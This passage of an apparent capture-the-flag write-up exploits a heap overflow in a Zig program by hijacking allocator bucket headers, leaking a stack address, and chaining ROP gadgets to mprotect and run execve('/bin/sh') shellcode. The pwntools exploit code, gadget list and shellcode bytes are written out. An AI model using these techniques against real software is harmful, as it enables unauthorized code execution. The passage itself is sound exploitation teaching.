        gop.value_ptr.captureStackTrace(ret_addr, .alloc);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (config.retain_metadata) {
            gop.value_ptr.freed &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (config.never_unmap) {
                gop.value_ptr.ptr_align &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ptr_align;
            }
        }

        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (config.verbose_log) {
            log.info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;large alloc {d} bytes at {*}&amp;#34;&lt;/span&gt;, .{ slice.len, slice.ptr });
        }
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; slice;
    }

    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; new_size_class &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; math.ceilPowerOfTwoAssert(&lt;span style=&#34;color:#66d9ef&#34;&gt;usize&lt;/span&gt;, new_aligned_size);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; ptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; self.allocSlot(new_size_class, ret_addr);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (config.verbose_log) {
        log.info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;small alloc {d} bytes at {*}&amp;#34;&lt;/span&gt;, .{ len, ptr });
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ptr[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;..&lt;/span&gt;len];
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;First in &lt;code&gt;alloc&lt;/code&gt;, if the aligned size is not larger than the largest bucket capacity (2**11) it will call &lt;code&gt;allocSlot&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-rust&#34; data-lang=&#34;rust&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fn&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;allocSlot&lt;/span&gt;(self: &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;Self, size_class: &lt;span style=&#34;color:#66d9ef&#34;&gt;usize&lt;/span&gt;, trace_addr: &lt;span style=&#34;color:#66d9ef&#34;&gt;usize&lt;/span&gt;) Error&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;[&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;]&lt;span style=&#34;color:#66d9ef&#34;&gt;u8&lt;/span&gt; {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; bucket_index &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; math.log2(size_class);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; first_bucket &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self.buckets[bucket_index] orelse &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; self.createBucket(
        size_class,
        bucket_index,
    );
    var bucket &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; first_bucket;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; slot_count &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;@&lt;/span&gt;divExact(page_size, size_class);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (bucket.alloc_cursor &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; slot_count) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; prev_bucket &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bucket;
        bucket &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; prev_bucket.next;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (bucket &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; first_bucket) {
            &lt;span style=&#34;color:#75715e&#34;&gt;// make a new one
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            bucket &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; self.createBucket(size_class, bucket_index);
            bucket.prev &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; prev_bucket;
            bucket.next &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; prev_bucket.next;
            prev_bucket.next &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bucket;
            bucket.next.prev &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bucket;
        }
    }
    &lt;span style=&#34;color:#75715e&#34;&gt;// change the allocator&amp;#39;s current bucket to be this one
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    self.buckets[bucket_index] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bucket;

    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; slot_index &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bucket.alloc_cursor;
    bucket.alloc_cursor &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;

    var used_bits_byte &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bucket.usedBits(slot_index &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; used_bit_index: &lt;span style=&#34;color:#a6e22e&#34;&gt;u3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;@&lt;/span&gt;intCast(u3, slot_index &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;// TODO cast should be unnecessary
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    used_bits_byte.&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;|=&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;@&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;u8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; used_bit_index);
    bucket.used_count &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    bucket.captureStackTrace(trace_addr, size_class, slot_index, .alloc);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; bucket.page &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; slot_index &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; size_class;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;allocSlot&lt;/code&gt; will check if the current bucket is able to allocate one more object, else it will iterate through the doubly linked list to look for a not full bucket.
And if it does nto find one, it creates a new bucket. When the bucket is allocated, it returns the available objet at &lt;code&gt;bucket.page + slot_index * size_class&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;As you can see, the &lt;code&gt;BucketHeader&lt;/code&gt; is structured like below in the &lt;code&gt;createBucket&lt;/code&gt; function:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-rust&#34; data-lang=&#34;rust&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fn&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;createBucket&lt;/span&gt;(self: &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;Self, size_class: &lt;span style=&#34;color:#66d9ef&#34;&gt;usize&lt;/span&gt;, bucket_index: &lt;span style=&#34;color:#66d9ef&#34;&gt;usize&lt;/span&gt;) Error&lt;span style=&#34;color:#f92672&#34;&gt;!*&lt;/span&gt;BucketHeader {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; page &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; self.backing_allocator.allocAdvanced(&lt;span style=&#34;color:#66d9ef&#34;&gt;u8&lt;/span&gt;, page_size, page_size, .exact);
    errdefer self.backing_allocator.free(page);

    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; bucket_size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bucketSize(size_class);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; bucket_bytes &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; self.backing_allocator.allocAdvanced(&lt;span style=&#34;color:#66d9ef&#34;&gt;u8&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;@&lt;/span&gt;alignOf(BucketHeader), bucket_size, .exact);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; ptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;@&lt;/span&gt;ptrCast(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;BucketHeader, bucket_bytes.ptr);
    ptr.&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; BucketHeader{
        .prev &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ptr,
        .next &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ptr,
        .page &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; page.ptr,
        .alloc_cursor &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,
        .used_count &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,
    };
    self.buckets[bucket_index] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ptr;
    &lt;span style=&#34;color:#75715e&#34;&gt;// Set the used bits to all zeroes
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;@&lt;/span&gt;memset(&lt;span style=&#34;color:#f92672&#34;&gt;@&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#66d9ef&#34;&gt;u8&lt;/span&gt;, ptr.usedBits(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)), &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, usedBitsCount(size_class));
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ptr;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It allocates a page to store objects in, then it allocates the &lt;code&gt;BucketHeader&lt;/code&gt; itself. Note that the page allocator will make allocations adjacent from each other. According to my several experiments the allocations grow &amp;ndash; from an initial given mapping &amp;ndash; to lower or higher addresses. I advice you to try different order of allocations in gdb to figure out this.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s quickly decribe each field of the &lt;code&gt;BucketHeader&lt;/code&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;.prev&lt;/code&gt; and &lt;code&gt;.next&lt;/code&gt; keep track of the doubly linked list that links buckets of same size.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.page&lt;/code&gt; contains the base address of the page that contains the objects that belong to the bucket.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;alloc_cursor&lt;/code&gt; contains the number of allocated objects.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;used_count&lt;/code&gt; contains the number of currently used objects.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;getting-read--write-what-were-primitive&#34;&gt;Getting read / write what were primitive&lt;/h2&gt;
&lt;p&gt;Well, the goal is to an arbitrary read / write by hiijacking the &lt;code&gt;.page&lt;/code&gt; and &lt;code&gt;.alloc_cursor&lt;/code&gt; fields of the &lt;code&gt;BucketHeader&lt;/code&gt;, this way if we hiijack pointers from a currently used bucket for a given size we can get a chunk toward any location.&lt;/p&gt;
&lt;p&gt;What we can do to get a chunk close to a  &lt;code&gt;BucketHeader&lt;/code&gt; structure would be:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Allocate large (&lt;code&gt;0x500-1&lt;/code&gt;) chunk, &lt;code&gt;0x800&lt;/code&gt; bucket.&lt;/li&gt;
&lt;li&gt;Allocate 4 other chunks of size &lt;code&gt;1000&lt;/code&gt;, which end up in the &lt;code&gt;0x400&lt;/code&gt; bucket.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Thus, first one page has been allocated to satisfy request one, then another page right after the other has been allocated to store the &lt;code&gt;BucketHeader&lt;/code&gt; for this bucket.
Then, to satisfy the four next allocations, the page that stores the objects has been allocated right after the one which stores the &lt;code&gt;BucketHeader&lt;/code&gt; of the &lt;code&gt;0x800&lt;/code&gt;-bucket, and finally a page is allocated to store the &lt;code&gt;BucketHeader&lt;/code&gt; of the &lt;code&gt;0x400&lt;/code&gt; bucket.&lt;/p&gt;
&lt;p&gt;If you do not understand clearly, I advice you to debug my exploit in &lt;code&gt;gdb&lt;/code&gt; by looking at the &lt;code&gt;chunklist&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;With this process the last allocated &lt;code&gt;0x400&lt;/code&gt;-sized chunk gets allocated &lt;code&gt;0x400&lt;/code&gt; bytes before the &lt;code&gt;BucketHeader&lt;/code&gt; of the bucket that handles &lt;code&gt;0x400&lt;/code&gt;-sized chunks.
Thus to get a read / write what were we can simply trigger the heap overflow with the &lt;code&gt;edit&lt;/code&gt; function to null out &lt;code&gt;.alloc_cursor&lt;/code&gt; and &lt;code&gt;.used_count&lt;/code&gt; and replace &lt;code&gt;.page&lt;/code&gt; by the target location.
This way the next allocation that will request &lt;code&gt;0x400&lt;/code&gt; bytes, which will trigger the hiijacked bucket and return the target location giving us the primitive.&lt;/p&gt;
&lt;p&gt;Which gives:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;alloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x500&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;):
    alloc(i, &lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;vv&amp;#34;&lt;/span&gt;)

edit(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x400&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x400&lt;/span&gt; \ &lt;span style=&#34;color:#75715e&#34;&gt;# padding&lt;/span&gt;
     &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x208000&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; \ &lt;span style=&#34;color:#75715e&#34;&gt;# next / prev + .page point toward the target =&amp;gt; 0x208000&lt;/span&gt;
     &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;) \ &lt;span style=&#34;color:#75715e&#34;&gt;# .alloc_cursor &amp;amp; .used_count&lt;/span&gt;
     &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)) &lt;span style=&#34;color:#75715e&#34;&gt;# used bits&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# next alloc(1000) will trigger the write what were&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;leak-stack&#34;&gt;Leak stack&lt;/h2&gt;
&lt;p&gt;To leak the stack I leaked the &lt;code&gt;argv&lt;/code&gt; variable that contains a pointer toward arguments given to the program, stored on the stack. That&amp;rsquo;s a reliable leak given it&amp;rsquo;s a known and fixed location, which can base used as a base compared with function&amp;rsquo;s stackframes.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;alloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# get chunk into target location (0x208000)&lt;/span&gt;
show(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x100&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# argv is located at 0x208000 + 0x100&lt;/span&gt;

stack &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;u64(io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;))
pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stack: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(stack)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;rop&#34;&gt;ROP&lt;/h2&gt;
&lt;p&gt;Now we&amp;rsquo;re able to overwrite whatever function&amp;rsquo;s stackframe, we have to find one that returns from context of &lt;code&gt;std.fs.file.File.read&lt;/code&gt; that reads the user input to the chunk. But unlucky functions like &lt;code&gt;add&lt;/code&gt;, &lt;code&gt;edit&lt;/code&gt; are inlined in the &lt;code&gt;main&lt;/code&gt; function. Moreover we cannot overwrite the return address of the &lt;code&gt;main&lt;/code&gt; function given that the exit handler call directly exit. Which means we have to corrput the stackframe of the &lt;code&gt;std.fs.file.File.read&lt;/code&gt; function called in the &lt;code&gt;edit&lt;/code&gt; function.
But the issue is that between the call to &lt;code&gt;SYS_read&lt;/code&gt; within &lt;code&gt;std.fs.file.File.read&lt;/code&gt; and the end of the function, variables that belong to the calling function&amp;rsquo;s stackframe are edited, corrupting the ROPchain. So what I did is using this gadget to reach a part of the stack that will not be corrupted:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;0x0000000000203715 : add rsp, 0x68 ; pop rbx ; pop r14 ; ret
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;With the use of this gadget I&amp;rsquo;m able to pop a few QWORD from the stack to reach another area of the stack where I write my ROPchain.
The goal for the ROPchain is to &lt;code&gt;mptotect&lt;/code&gt; a shellcode and then jump on it. The issue is that I didn&amp;rsquo;t find a gadget to control the value of the &lt;code&gt;rdx&lt;/code&gt; register but when it returns from &lt;code&gt;std.fs.file.File.read&lt;/code&gt; it contains the value of size given to &lt;code&gt;edit&lt;/code&gt;. So to call &lt;code&gt;mprotect(rdi=0x208000, rsi=0x1000, rdx=0x7)&lt;/code&gt; we have to call &lt;code&gt;edit&lt;/code&gt; with a size of &lt;code&gt;7&lt;/code&gt; to write on the &lt;code&gt;std.fs.file.File.read&lt;/code&gt; saved RIP the value of the magic gadget seen previously.&lt;/p&gt;
&lt;p&gt;Here is the ROPchain:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;edit(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x400&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x400&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x208000&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x000&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;))
&lt;span style=&#34;color:#75715e&#34;&gt;# with the use of the write what were we write the shellcode at 0x208000&lt;/span&gt;

shellcode &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# execve(&amp;#34;/bin/sh&amp;#34;, NULL, NULL)&lt;/span&gt;

alloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;, shellcode)

&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x0000000000201fcf : pop rax ; syscall
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x0000000000203147 : pop rdi ; ret
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x000000000020351b : pop rsi ; ret
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x00000000002035cf : xor edx, edx ; mov rsi, qword ptr [r9] ; xor eax, eax ; syscall
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x0000000000201e09 : ret
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x0000000000203715 : add rsp, 0x68 ; pop rbx ; pop r14 ; ret
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;

edit(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x400&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x400&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(stack&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x50&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;))
&lt;span style=&#34;color:#75715e&#34;&gt;# write ROPchain into the safe area on the stack &lt;/span&gt;
